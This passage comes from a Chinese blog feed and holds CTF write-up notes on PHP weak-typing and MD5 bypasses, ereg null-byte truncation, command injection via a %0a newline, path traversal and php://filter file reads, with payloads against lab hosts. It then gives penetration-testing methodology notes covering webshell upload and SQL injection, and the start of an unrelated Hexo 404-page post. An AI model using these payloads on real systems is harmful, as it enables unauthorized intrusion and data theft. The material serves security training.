class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;<span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;#"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><p>$md51=QNKCDZO的MD5编码</p><p>$md52=传入的参数a的MD5编码</p><p>$a 不等于’QNKCDZO’ 并且 $md51等于 $md52（也就是两个不同的字符串md5值要相同）</p></li></ul><p>将QNKCDZO进行MD5加密，密文为0e830400451993494058024219903391，发现密文为0e开头，PHP在进行比较运算时，0e开头字符串都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&apos;240610708&apos;); // 0e462097431906509019562988736854 </span><br><span class="line">md5(&apos;QNKCDZO&apos;); // 0e830400451993494058024219903391</span><br></pre></td></tr></table></figure><ul><li>题目:   <a href="http://172.16.43.117/php_bugs-master/13.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/13.php</a></li><li>payload:   <code>?a=240610708</code></li></ul><h4 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><p>既要是纯数字,又要有<code>#biubiubiu</code></p><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><p>注意：需将#编码</p></li><li><p>题目：<a href="http://172.16.43.117/php_bugs-master/15.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/15.php</a></p></li><li><p>payload：<code>?nctf=1%00%23biubiubiu</code></p></li></ul><h4 id="md5-函数-使用数组绕过"><a href="#md5-函数-使用数组绕过" class="headerlink" title="md5()函数===使用数组绕过"></a>md5()函数===使用数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><p>若为<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>?username=QNKCDZO&amp;password=240610708</code><br>因为<code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code> 转成<code>0</code>了<br>也可以使用数组绕过<br><code>?username[]=1&amp;password[]=2</code></p><p>但此处是<code>===</code>，只能用数组绕过，<code>PHP</code>对数组进行<code>hash</code>计算都会得出<code>null</code>的空值<br><code>?username[]=1&amp;password[]=2</code></p></li><li><p>题目： <a href="http://172.16.43.117/php_bugs-master/18.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/18.php</a></p></li><li>payload： <code>?username[]=1&amp;password[]=2</code></li></ul><h4 id="ereg-函数strpos-函数用数组返回NULL绕过"><a href="#ereg-函数strpos-函数用数组返回NULL绕过" class="headerlink" title="ereg()函数strpos() 函数用数组返回NULL绕过"></a>ereg()函数strpos() 函数用数组返回NULL绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;123456&#125;"</span>;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid password'</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>分析<ul><li>方法一：<br>ereg()正则函数可以用<code>%00</code>截断<br><code>?password=1%00--</code></li><li>方法二：<br>将<code>password</code>构造一个数组，传入之后，<code>ereg</code>是返回<code>NULL</code>的，<code>===</code>判断<code>NULL</code>和 <code>FALSE</code>，是不相等的，所以可以进入第二个判断，而<code>strpos</code>处理数组，也是返回<code>NULL</code>，注意这里的是<code>!==</code>，<code>NULL!==FALSE</code>,条件成立，拿到<code>flag</code><br><code>?password[]=</code></li></ul></li><li>题目： <a href="http://172.16.43.117/php_bugs-master/19.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/19.php</a></li><li>payload：<code>?password=a%00--</code></li></ul><h4 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><ul><li>不能是数字，且又要大于1336，看上去是矛盾的</li></ul></li><li><p>解决</p></li></ul><p>​       利用<code>PHP</code>弱类型的一个特性，当一个整型和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比。如果输入一个<code>1337a</code>这样的字符串，在<code>is_numeric</code>中返回<code>true</code>，然后在比较时被转换成数字<code>1337</code>，这样就绕过判断输出flag</p><ul><li>题目：<a href="http://172.16.43.117/php_bugs-master/22.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/22.php</a></li><li>payload：<code>?password=123456a</code></li></ul><h3 id="其他常见web类型"><a href="#其他常见web类型" class="headerlink" title="其他常见web类型"></a>其他常见web类型</h3><hr><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><a href="https://www.freebuf.com/articles/web/137923.html" rel="external nofollow" target="_blank">参考</a></p><p>命令连接符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">；  命令1；命令2   多个命令顺序执行</span><br><span class="line">&amp;&amp;  命令1&amp;&amp;命令2   当命令1执行成功，命令2才会执行。命令1执行不成功时，命令2不会执行</span><br><span class="line">||  命令1||命令2   当命令1执行不成功，命令2才会执行。命令1执行成功时，命令2不会执行</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="number">1</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><p>传入参数1，并且长度不能大于8</p></li><li><p>题目</p><p><a href="http://172.16.43.115:18099/exec.php" rel="external nofollow" target="_blank">http://172.16.43.115:18099/exec.php</a></p></li><li><p>payload  <code>?1=cat *</code></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">        $target=trim($target);</span><br><span class="line">        <span class="comment">// var_dump($target);</span></span><br><span class="line">        <span class="comment">// Set blacklist</span></span><br><span class="line">        $substitutions = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">                <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">        <span class="comment">// var_dump($target);</span></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Windows</span></span><br><span class="line">                $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// *nix</span></span><br><span class="line">                $cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><p>加入了黑名单，但是黑名单漏了%0a</p></li><li><p>题目 <a href="http://172.16.43.115/exec/index.php" rel="external nofollow" target="_blank">http://172.16.43.115/exec/index.php</a></p></li><li><p>payload: <code>?ip=8.8.8.8%0acat flag.php</code></p></li></ul><h4 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h4><ul><li>题目   <a href="http://172.16.43.115:19002/" rel="external nofollow" target="_blank">http://172.16.43.115:19002/</a><ul><li>工具  ：<a href="https://github.com/BugScanTeam/GitHack" rel="external nofollow" target="_blank">GitHack</a></li><li>用法：python GitHack.py <a href="http://www.example.com/" rel="external nofollow" target="_blank">http://www.example.com/</a></li></ul></li><li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080703.png" alt=""></li></ul><h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><hr><p>PHP中文件包含函数有以下四种：</p><blockquote><p>require()</p><p>require_once()</p><p>include()</p><p>include_once()</p></blockquote><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><ul><li>题目 <a href="http://172.16.43.115/include/index.php" rel="external nofollow" target="_blank">http://172.16.43.115/include/index.php</a></li><li>payload ：<code>?file=../../../../../home/flag</code></li></ul><ul><li><p>题目  <a href="http://4.chinalover.sinaapp.com/web7/index.php" rel="external nofollow" target="_blank">http://4.chinalover.sinaapp.com/web7/index.php</a></p></li><li><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" rel="external nofollow" target="_blank">php伪协议</a></p></li><li><p>方法：读index.php</p><p><code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>base64解码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="简单脚本辅助"><a href="#简单脚本辅助" class="headerlink" title="简单脚本辅助"></a>简单脚本辅助</h4><hr><ul><li><p>题目  <a href="http://172.16.43.117/web/08/index.php" rel="external nofollow" target="_blank">http://172.16.43.117/web/08/index.php</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.16.43.117/web/08/index.php'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">html = s.get(url).content</span><br><span class="line"></span><br><span class="line">reg = <span class="string">r'(.*)&lt;/p&gt;'</span></span><br><span class="line">res = re.findall(reg,html)</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'result'</span>:eval(res[<span class="number">0</span>])&#125;</span><br><span class="line"></span><br><span class="line">flag = s.post(url,data=payload)</span><br><span class="line"><span class="keyword">print</span> flag.content</span><br></pre></td></tr></table></figure></li></ul><h2 id="day03–yiyangqianxixxxx"><a href="#day03–yiyangqianxixxxx" class="headerlink" title="day03–yiyangqianxixxxx"></a>day03–yiyangqianxixxxx</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>此内容为<code>严老板</code>编写总结，7iny整理。仅供学习参考，<strong>请及时向漏洞平台上报漏洞</strong></p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul><li>确立渗透测试目标 ：省企业网站，或任意学习网站。</li><li>确立渗透测试范围：隶属于该网站域名下所有网站均可。</li><li>渗透测试手段：通过信息搜集得到网站的主要信息，来对其进行各种漏洞的测试，包括但不限于sql注入、xss、信息泄露。考虑到的攻击手段要全面，只要有可能存在漏洞的地方就去尝试。</li></ul><p>选择的目标若未找到漏洞，可只记录信息搜集过程，并且将可能存在漏洞点的（你认为不安全的地方）标注出来。<br>可多选择几个目标进行尝试，但在渗透过程中要进行多方面考虑，尝试每一个可能的攻击面，若找到漏洞甚至getshell不得对系统进行任何破坏，一切也测试为目的。渗透过程中也要注意保护系统，对服务器的扫描等行为要确保不会影响服务。</p><p>详细记录整个过程，把每个值得记录的地方都写下来。并向相关漏洞平台上报漏洞</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>在拿到一个网站的时候，首先是对这个网站要有一个比较全面的了解，就是对这个网站进行信息收集。在信息收集阶段，一般要收集这个网站的IP地址信息，是否使用CDN，使用哪种语言开发，中间件是什么</p><h4 id="IP端口扫描"><a href="#IP端口扫描" class="headerlink" title="IP端口扫描"></a>IP端口扫描</h4><p>端口发现的目的是查看是否有高危端口，比如135/445/3389或者常见的数据库端口等 比如，如果存在445端口，我们就可以测试是否存在永恒之蓝漏洞，在端口发现阶段，如果存在像7001或者8080这样的端口的情况，我们就要看下这些端口是在运行哪些服务</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>对网站目录的扫描，我们可以观察是否存在网站后台管理 如果存在的话，可以尝试弱口令登录 如果尝试多次登录没有锁定，也可以尝试简单的口令爆破，因为现场测试时间有限，长时间的爆破是不可能的 </p><h4 id="主机层漏洞"><a href="#主机层漏洞" class="headerlink" title="主机层漏洞"></a>主机层漏洞</h4><p>主机层的漏洞就是看端口开放情况，判断开放的服务，然后测试是否有漏洞，比如溢出漏洞，反序列化漏洞</p><h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><p>中间件漏洞比较简单，像weblogic反序列化，还有就是使用中间件部署web木马，直接拿服务器权限另外还有一些框架的漏洞，比如Struts2的漏洞。这些漏洞都是可以直接使用工具进行检测的</p><h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><p>xss漏洞，sql注入漏洞，还有一些越权等逻辑漏洞</p><p>比如XSS漏洞，一般存在于搜索框中或者注册信息等地方<br>当发现有搜索框或者注册信息或者发布消息，需要输入内容，且输入消息会返回到页面让读者查看的时候，就需要测试一下是否存在xss漏洞<br>当然，我们还需要联想到，当我们看到搜索框的时候，我们需要测试一下搜索的内容是否是从数据库中去调取的，如果是的话，可能也会存在SQL注入的可能<br>上传漏洞一般配合解析漏洞使用，如果服务器端与前端都没有对上传格式进行限制，那么我们可以直接上传webshell，拿服务器权限<br>如果网站对上传格式有限制，我们需要抓包对文件类型进行修改，然后上传，验证是前端还是服务器端做的限制，如果是前端做的限制就可以改包上传了，上传后注意观察返回包的内容，是否有文件上传的路径与上传后的文件名<br>当网站是使用iis6.0搭建的网站时可以使用IIS6.0特有的两个文件解析漏洞进行测试</p><p>SQL注入漏洞常见的存在于带参数链接或者POST数据包 类似于xxx.jsp?id=xxx<br>或者像登录时使用POST请求方式传输用户名和密码，至于验证是否存在SQL注入</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>在测试的过程中，一般会使用到<code>SQLmap</code>，<code>wvs</code>，<code>kali</code>，<code>k8</code>，<code>菜刀</code>，<code>webshell</code>，<code>御剑</code>，<code>Nessus</code>等还有一些反序列化的检测工具和脚本，这些可以在GitHub上，或其他地方找到<br>端口扫描工具可以使用<code>nmap</code>，Windows下的zmap（其实就是nmap），常用参数可以上网搜一下，比较详细<br>远程连接工具可以使用<code>putty</code>，或者<code>crt</code><br>数据库连接工具可以使用<code>Navicat</code></p><h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h4><p>渗透的思路的话，一般就是信息收集，整理，利用，测试（验证），获取权限，到此为止，<strong>禁止拿数据或者对用户网络造成影响</strong><br>剩下的就是对工具的熟练使用以及丰富自己的渗透思路，能力大的可以从代码层面去发现漏洞，说不定会有意外收获</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年六月总结</title>
      <link href="/209f9357.html"/>
      <url>/209f9357.html</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1906.jpg" alt=""></p><a id="more"></a><h2 id="hexo倒腾"><a href="#hexo倒腾" class="headerlink" title="hexo倒腾"></a>hexo倒腾</h2><h3 id="问题-404页面不能正常显示"><a href="#问题-404页面不能正常显示" class="headerlink" title="问题 404页面不能正常显示"></a>问题 404页面不能正常显示</h3><p>使用官方给的代码时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"https://qzone.qq.com/gy/404/style/404style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/plain"</span> <span class="attr">src</span>=<span class="string">"http://www.qq.com/404/search_children.js"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">homePageUrl</span>=<span class="string">"/"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">"回到我的主页"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://qzone.qq.com/gy/404/data.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://qzone.qq.com/gy/404/page.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span 